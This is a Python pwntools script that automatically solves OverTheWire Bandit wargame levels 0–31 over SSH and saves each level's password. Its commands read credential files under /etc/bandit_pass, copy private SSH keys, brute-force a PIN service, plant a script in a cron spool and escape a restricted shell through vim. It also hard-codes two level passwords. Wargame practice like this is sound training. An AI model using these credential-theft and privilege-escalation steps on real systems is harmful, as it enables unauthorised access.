#! /usr/bin/env python3

import pwn
import time
import os

def display():
    global flag, user
    print ("\n")
    print ("########################################################")
    print (" \t\t USER = "+user.decode("utf-8"))
    print (" \t\t FLAG = "+flag.decode("utf-8"))
    print ("########################################################")
    print ("\n")


def add_flag():
    global flag, i, user
    i+=1
    user=b"bandit"+bytes(str(i),"ascii")
    if user not in [b'bandit15', b'bandit16', b'bandit25']:
        flag=flag[2:]
    f.write(user+b":\t"+flag)
    flag=flag[:-1]
    display()

def connexion():
    global flag, host, user, port 
    return pwn.ssh(user, host, password=flag, port=port)

def start():
    global s, sh
    s=connexion()
    sh=s.run('sh')

def end():
    global s, sh, flag, user
    if user != b'bandit6':
        flag = sh.recvline()
    add_flag()
    s.close()

# set variables
f=open("flag.txt","wb")
i=-1
host='bandit.labs.overthewire.org'
user=b"bandit"+bytes(str(i),"ascii")
port=2220

# bandit0
flag=b"$ bandit0\n"
add_flag()

# bandit0 --> bandit1
start()
sh.sendline(b'cat *')  #sh.sendline(b'cat readme')
end()

# bandit1 --> bandit2
start()
sh.sendline(b'cat ./-')
end()

# bandit2 --> bandit3
start()
sh.sendline(b'cat *')  #sh.sendline(b'cat spaces\ in\ this\ filename')
end()

# bandit3 --> bandit4
start()
sh.sendline(b'cat inhere/.hidden')
end()

# bandit4 --> bandit5
start()
sh.sendline(b'cat $(find inhere/ -type f | xargs file | grep text | cut -d":" -f1)')
#sh.sendline(b'cat inhere/./-file07')
end()


# bandit5 --> bandit6
start()
sh.sendline(b'cat $(find . -size 1033c)') #sh.sendline(b'cat inhere/maybehere07/.file2')
end()

# bandit6 --> bandit7
start()
sh.sendline(b'export TF=$(mktemp)')
sh.sendline(b'find / -user bandit7 -group bandit6 -size 33c > $TF')
sh.sendline(b'cat $(cat $TF)')
#sh.sendline(b'cat /var/lib/dpkg/info/bandit7.password')
flag=sh.recvline()
while b"Permission denied" in flag or b"No such file or directory" in flag:
    flag=sh.recvline()
end()

# bandit7 --> bandit8
start()
sh = s.run('sh')
sh.sendline(b'cat data.txt | grep "millionth" | cut -c11-')
end()

# bandit8 --> bandit9
start()
sh.sendline(b'cat data.txt | sort | uniq -u')
end()

# bandit9 --> bandit10
start()
sh.sendline(b'cat data.txt | strings | grep "===" | tail -n 1 | cut -d" " -f2')
end()

# bandit10 --> bandit11
start()
sh.sendline(b'base64 -d data.txt | cut -d" " -f4')
end()

# bandit11 --> bandit12
start()
sh.sendline(b'cat data.txt | tr "A-Za-z" "N-ZA-Mn-za-m" | cut -d" " -f4')
end()

# bandit12 --> bandit13
start()
sh.sendline(b'export TD=$(mktemp -d)')
sh.sendline(b'xxd -r data.txt > $TD/data.gz')
sh.sendline(b'cd $TD')
sh.sendline(b'gzip -d data.gz')
sh.sendline(b'mv data data.bz2')
sh.sendline(b'bzip2 -d data.bz2')
sh.sendline(b'mv data data.gz')
sh.sendline(b'gzip -d data.gz')
sh.sendline(b'mv data data.tar')
sh.sendline(b'tar xvf data.tar')
sh.sendline(b'mv data5.bin data.tar')
sh.sendline(b'tar xvf data.tar')
sh.sendline(b'mv data6.bin data.bz2')
sh.sendline(b'bzip2 -d data.bz2')
sh.sendline(b'mv data data.tar')
sh.sendline(b'tar xvf data.tar')
sh.sendline(b'mv data8.bin data.gz')
sh.sendline(b'gzip -d data.gz')
sh.sendline(b'cat data | cut -d" " -f4')
sh.recvuntil('data8.bin\n')
sh.recvuntil('$ $ ')
end()

# bandit13 --> bandit14
start()
sh.sendline(b'cat sshkey.private')
f2=open('sshkey','wb')
sh.recvuntil(b"$ ")
f2.write(sh.recvuntil(b"-----END RSA PRIVATE KEY-----\n"))
f2.close()
s.close()
s=pwn.ssh('bandit14', host, keyfile='./sshkey', port=port)
sh=s.run('sh')
sh.sendline(b'cat /etc/bandit_pass/bandit14')
end()
os.system('rm sshkey')

# bandit14 --> bandit15
start()
sh.sendline(b'echo '+flag+b' | nc localhost 30000')
sh.recvline()
end()

# bandit15 --> bandit16
start()
sh.sendline(b'openssl s_client -quiet -connect 127.0.0.1:30001')
sh.recvuntil(b'\nverify return:1\n')
sh.sendline(flag)
sh.recvline()
sh.recvline()
sh.recvline()
end()

# bandit16 --> bandit17
start()
sh.sendline(b'nmap localhost -p31000-32000')
sh.recvuntil('PORT      STATE SERVICE\n')
data=sh.recvuntil('\nNmap done')
L=data.split(b"\n")[:-2]
M=[x[:5] for x in L]
s.close()

def exploit_bandit16(M):
    for elem in M:
        start()
        sh.sendline(b'openssl s_client -quiet -connect localhost:'+elem)
        if b"unknown" not in sh.recvline():
            sh.recvuntil(b'\nverify return:1\n')
            sh.recvline()
            sh.recvline()
            sh.sendline(flag)
            if flag not in sh.recvline():
                f3=open("sshkey","wb")
                f3.write(sh.recvuntil("-----END RSA PRIVATE KEY-----\n"))
                f3.close()
                return
            s.close()
    return

exploit_bandit16(M)
s.close()
s=pwn.ssh('bandit17', host, keyfile='./sshkey', port=port)
sh=s.run('sh')
sh.sendline(b'cat /etc/bandit_pass/bandit17')
end()
os.system('rm sshkey')

# bandit17 --> bandit18
start()
sh.sendline(b'diff * | head -n 2 | tail -n 1 | cut -d" " -f2')
end()

# bandit18 --> bandit19
start()
sh.sendline(b'cat readme')
end()

# bandit19 --> bandit20
start()
sh.sendline(b'./bandit20-do cat /etc/bandit_pass/bandit20')
end()

# bandit20 --> bandit21
start()
sh.sendline(b'echo '+flag+b' | nc -l -p 6000')
s2=pwn.ssh(user, host, password=flag, port=port)
sh2=s2.run('sh')
sh2.sendline(b'./suconnect 6000')
s2.close()
end()

# bandit21 --> bandit22
start()
sh.sendline(b'cat $(cat /usr/bin/cronjob_bandit22.sh | cut -d" " -f3 | head -n 2 | tail -n 1)')
end()

# bandit22 --> bandit23
start()
sh.sendline(b'cat /tmp/$(echo "I am user bandit23" | md5sum | cut -d" " -f1)')
end()

# bandit23 --> bandit24
start()
sh.sendline(b'export TD=$(mktemp -d)')
sh.sendline(b'echo "#! /bin/sh" >> $TD/input')
sh.sendline(b'echo "cat /etc/bandit_pass/bandit24 >> $TD/output" >> $TD/input')
sh.sendline(b'chmod -R 777 $TD')
sh.sendline('cp $TD/input /var/spool/bandit24/')
print("Waiting 60sec for crontab ...")
timecount=60
while timecount>0:
    print(timecount, end='')
    time.sleep(0.33)
    print('.', end='')
    time.sleep(0.33)
    print('.', end='')
    time.sleep(0.33)
    timecount-=1
print(timecount)
sh.sendline('cat $TD/output')
sh.recvuntil('$ $ $ $ $ ')
end()

# bandit24 --> bandit25
start()

def exploit_bandit24(sh):
    sh.sendline(b'nc localhost 30002')
    print(sh.recvline())
    for i in range(10000):
        pincode='{0:04}'.format(i).encode()
        sh.sendline(flag+b' '+pincode)
        print(b'Try: '+pincode)
        output=sh.recvline()
        if b'Timeout' in output:
            sh.sendline(b'nc localhost 30002')
            print(sh.recvline())
        elif output!=b'Wrong! Please enter the correct pincode. Try again.\n':
            print(output)
            sh.recvuntil(b'The password of user bandit25 is ')
            return

exploit_bandit24(sh)
end()

# bandit25 --> bandit26
start()
sh.sendline("cat bandit26.sshkey")
f4=open("sshkey","wb")
f4.write(sh.recvline()[2:])
f4.write(sh.recvuntil("-----END RSA PRIVATE KEY-----\n"))
f4.close()
s.close()

print()
print("Réduire la fenêtre au maximum")
print("ssh -i sshkey bandit26@bandit.labs.overthewire.org -p 2220")
print("Appuyer sur 'v' puis ':e cat /etc/bandit_pass/bandit26'")
flag=b'$ 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z\n'
add_flag()
os.system('rm sshkey')

# bandit26 --> bandit27
print("Réduire la fenêtre au maximum")
print("Appuyer sur 'v' puis ':set shell=/bin/bash' et ':shell' pour escape vim (http://zteeed.fr:4000)")
print("env command --> env /bin/sh --> id euid=bandit27")
flag=b'$ 3ba3118a22e93127a4ed485be72ef5ea\n'
add_flag()

# git challenges

def git_clone():
    global flag, user, sh
    sh.sendline(b'TF=$(mktemp -d); cd $TF')
    sh.sendline(b'git clone ssh://%b-git@localhost/home/%b-git/repo' % (user, user))
    sh.recvuntil(b'Are you sure you want to continue connecting (yes/no)?')
    sh.sendline(b'yes')
    sh.recvuntil(b'%b-git@localhost\'s password:' % (user))
    sh.sendline(flag)
    sh.recvuntil(b'done.')
    if user==b'bandit30': sh.recvuntil(b'done.')
    sh.sendline(b'cd repo')

# bandit27 --> bandit28
start()
git_clone()
sh.sendline(b'git checkout $(git log --branches -1 --pretty=format:"%H")')
sh.sendline(b'cat README')
sh.recvuntil(b'The password to the next level is')
end()

# bandit28 --> bandit29
start()
git_clone()
sh.sendline(b'git checkout $(git log --branches -2 --pretty=format:"%H" | tail -n 1)')
sh.sendline(b'cat README.md')
sh.recvuntil(b'- password')
end()

# bandit29 --> bandit 30
start()
git_clone()
sh.sendline(b'sha=$(git show-ref | grep dev | head -n 1 | cut -d\' \' -f1)')
sh.sendline(b'git update-ref HEAD $sha')
sh.sendline(b'git reset --hard')
sh.sendline(b'cat README.md')
sh.recvuntil(b'- password')
end()

# bandit30 --> bandit 31
start()
git_clone()
sh.sendline(b'sha=$(git show-ref | tail -n 1 | cut -d\' \' -f1)')
sh.sendline(b'git cat-file -p $sha')
sh.recvuntil(b'$ $ ')
end()

# bandit31 --> bandit32
start()
git_clone()
sh.sendline(b'echo "May I come in?" > key.txt')
sh.sendline(b'rm .gitignore')
sh.sendline(b'git add .')
sh.sendline(b'git commit -m "give me that flag"')
sh.sendline(b'git push')
sh.recvuntil(b'Are you sure you want to continue connecting (yes/no)?')
sh.sendline(b'yes')
sh.recvuntil(b'bandit31-git@localhost\'s password:')
sh.sendline(flag)
sh.recvuntil(b'remote: Well done! Here is the password for the next level:\x1b[K\n')
sh.recvuntil(b'remote')
end()

# end
f.close()
print ("\n")
print ("\t\t OverTheWire Bandit Passwords")
print ("\n")
os.system('cat flag.txt')
print ("\n")
os._exit(0)
